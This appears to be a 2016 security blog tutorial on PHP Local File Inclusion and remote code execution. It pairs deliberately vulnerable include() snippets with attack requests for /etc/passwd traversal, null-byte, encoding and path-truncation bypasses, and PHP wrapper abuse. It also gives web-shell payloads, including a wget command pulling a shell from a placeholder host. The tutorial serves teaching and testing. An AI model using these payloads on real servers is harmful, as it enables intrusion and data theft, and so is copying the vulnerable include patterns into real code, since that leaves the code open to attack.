@@ -1,0 +1,233 @@
+
+Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities for PHP
+Saturday 9 July 2016 (2016-07-09)
+Thursday 3 November 2016 (2016-11-03)
+noraj (Alexandre ZANNI)
+lfi, security, vulnerability
+🇬🇧
+
+Local File Inclusion (LFI) is a type of vulnerability concerning web server. It allow an attacker to include a local file on the web server. It occurs due to the use of not properly sanitized user input.
+
+This can lead to:
+
+    outpouting source code or sensitive information
+    code execution (server-side/client-side)
+    Denial of service (DoS)
+
+Examples#
+
+I'll give some examples in PHP but it can also occurs in Perl, ASP, JSP, or whatever.
+Basic includes#
+
+Server code:
+
+<?php
+$file = $_GET['file'];
+if(isset($file))
+{
+  include("$file");
+}
+
+Legitimate request:
+
+http://example.com/index.php?file=contact.php
+
+Bad request:
+
+http://example.com/index.php?file=/etc/passwd
+
+Here an attacker can simply chose to modify the GET request to give a file that is not in the web serer folder.
+Directory traversal attack#
+
+Server code:
+
+<?php
+$file = $_GET['file'];
+if(isset($file))
+{
+  include("lib/functions/$file");
+}
+
+Legitimate request:
+
+http://example.com/index.php?file=displaycontent.php
+
+Bad request:
+
+http://example.com/index.php?file=../../../../../etc/passwd
+
+Here an attacker can use relative path to get out of the web server folder.
+Null Byte Injection#
+
+Server code:
+
+<?php
+$file = $_GET['file'];
+if(isset($file))
+{
+  include("lib/functions/$file.php");
+}
+
+Legitimate request:
+
+http://example.com/index.php?file=displaycontent
+
+Bad request:
+
+http://example.com/index.php?file=../../../../../etc/passwd%00
+
+Here the script force to use .php file extension, but an attacker, by adding a null byte the the path, can drop the extension.
+
+Why? %00 is the http encoded version of 0x00 in hex. It's the null caracter, a null byte. In C it's written \0 and it means the string termination character so that will stop processing the string immediately.
+
+PHP (like other web server lang) require to process high-level code at system level and it's usually accomplished by using C/C++ functions. Bytes following the delimiter will be ignored.
+
+If in php we have:
+
+$tmp='try';
+
+In C we have:
+
+char tmp[4];
+tmp[0] = 't';
+tmp[1] = 'r';
+tmp[2] = 'y';
+tmp[3] = '\0';
+
+so if a null byte is injected int php
+
+$tmp='try\0next'
+
+Will procude in C:
+
+char tmp[9];
+tmp[0] = 't';
+tmp[1] = 'r';
+tmp[2] = 'y';
+tmp[3] = '\0';
+tmp[4] = 'n';
+tmp[5] = 'e';
+tmp[6] = 'x';
+tmp[7] = 't';
+tmp[8] = '\0';
+
+Go here for more details.
+
+Note: Null byte injection has been fixed in PHP 5.3.4 (unsupported).
+Filter Evasion#
+
+Someone aware of previous vulnerabilities may think he will be secure wit a proper filter like:
+
+<?php
+$file = str_replace('../', '', $_GET['file']);
+if(isset($file))
+{
+  include("lib/functions/$file");
+}
+
+Legitimate request:
+
+http://example.com/index.php?file=displaycontent
+
+Bad request (HTTP char encoding):
+
+http://example.com/index.php?file=..%2F..%2F..%2F..%2F..%2Fetc/passwd
+
+or bad request (double all chars):
+
+http://example.com/index.php?file=....//....//....//....//....//etc/passwd
+
+The script replace all ../ with nothing but what if we encode slashs or dotes? or doubling them?
+
+The first method won't work on recent PHP version but the second one will work nearly every times.
+Double encoding#
+
+Sometimes it's possible to encode some characters of the URL to bypass filters as we have seen previously. This is because the browser decodes the input but PHP does not.
+
+Cf. OWASP:
+
+    By using double encoding it’s possible to bypass security filters that only decode user input once. The second decoding process is executed by the backend platform or modules that properly handle encoded data, but don't have the corresponding security checks in place.
+
+For example if urlencode() is used in PHP.
+
+So to continue to bypass the filter a double encoding is needed:
+
+    We encode the data the first time, for example ../etc/passwd begins %2E%2E%2Fetc%2Fpasswd
+    And now encode the %: %252E%252E%252Fetc%252Fpasswd
+
+Path truncation#
+
+As all version of PHP since 5.3.4 are no more vulnerable to null byte injection, we need more methods to bypass extensions filter such as:
+
+include('lib/functions/' + $_GET['file'] + '.php');
+
+Facts:
+
+    on UNIX /./etc/passwd is the same as /etc/passwd
+    on PHP trailing slash are often stripped off so /etc/passwd/ is the same as /etc/passwd
+    on PHP as trailing slash are stripped off, they can be added as much as we want so /etc/passwd////// is the same as /etc/passwd
+    on PHP ./ can be appended as many tiems as you want to a path so /etc/passwd/., /etc/passwd/./, /etc/passwd/././. are all the same as /etc/passwd.
+
+But there is another fact that is interesting to bypass extensions filter: on a lot of PHP installation, filenames longer than 4096 bytes are silently truncated! Characters after the firsts 4096 bytes are discarded and no error is triggered.
+
+So what? Let's craft a very long path to discard .php extension!
+
+Take your request and append a thousand times ./ to ../../../etc/passwd/./././././<...> so will get ../../../etc/passwd/./././././<...>/././.php but the filename will be longer than 4096 bytes so the overlong part will be dropped. So we'll just get our request and thousand times ./ that will be equivalent to ../../../etc/passwd.
+Reverse path truncation#
+
+It also exist the reverse version of path truncation. This works by trying to fill the file name from the beginning to exceed the MAX_PATH value.
+
+But this method has a disadvantage: you have to inject the exact number of bytes to truncate only the .php extension. If too much ../ are injected the filename will also be truncated. Plus, that's why you'll need to add some characters if the path has not the good length because bytes are injected by 3 due to ../.
+
+Details can be found here.
+php://filter#
+
+You found a LFI, you included the file but you can't see its content?
+
+Some file like config.php or libraries of functions are only executed but not shown. So to help us show them, we can use some PHP wrappers.
+
+A famous one is index.php?page=php://filter/read=convert.base64-encode/resource=config, this filter will encode the page in base64 and show the result like if we have done index.php?page=config and then base64 it.
+expect://#
+
+A rare but very useful wrapper is expect://, it allows execution of system commands via php. But it is not enabled by default, an extension needs to be installed.
+
+http://example.com/index.php?file=expect://ls
+
+php://input#
+
+php://input allows to send payload via POST request.
+
+Request:
+
+http://example.com/index.php?file=php://input
+
+Post data (uploading a webshell):
+
+<?php system('wget http://x.x.x.x/php-shell.php -O /var/www/html/shell.php'); ?>
+
+Post data (getting server infos):
+
+<?php phpinfo(); ?>
+
+data://#
+
+data:// can be used to include executable PHP code.
+
+http://example.com/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA2fPg%3d%3d
+
+or
+
+http://example.com/index.php?file=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>
+
+Another payload can be <?php phpinfo(); die();?>, the die statement will prevent the execution of the rest of the script or the execution of the incorrectly decoded extension appended to the stream.
+
+A more usable PHP payload webshell:
+
+<form action="<?=$_SERVER['REQUEST_URI']?>" method="POST"><input type="text" name="x" value="<?=htmlentities($_POST['x'])?>"><input type="submit" value="cmd"></form><pre><? echo `{$_POST['x']}`; ?></pre><? die(); ?>
+
+To directly execute a command the data request + payload may be: data:,<?system($_GET['x']);?>&x=ls or data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls.
+
+The best way to successfully execute the payload is to base64 it and then URL encode it.
+zip:// and phar://#
+
+Archive a php script into a zip or a phar (or others archive with others wrappers), send the archive and tell which file has to be read: zip://archive.zip#file.php
